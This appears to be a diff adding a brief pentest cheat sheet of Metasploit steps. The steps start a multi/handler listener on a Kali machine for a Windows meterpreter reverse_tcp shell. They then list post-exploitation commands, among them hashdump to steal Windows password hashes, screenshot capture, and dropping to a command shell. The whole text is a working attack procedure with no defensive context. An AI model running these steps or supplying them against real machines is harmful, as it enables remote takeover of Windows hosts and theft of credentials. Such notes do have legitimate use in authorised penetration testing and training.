@@ -1,0 +1,14 @@
+1. Set up listener on Kali
+    msfconsole
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST <Kali_IP>
+    set LPORT 5555
+    run
+2. Run post-exploitation
+    sysinfo         # OS info
+    getuid          # Current user
+    hashdump        # Dump Windows password hashes (requires admin)
+    screenshot      # Capture screen
+    shell           # Get CMD shell
+
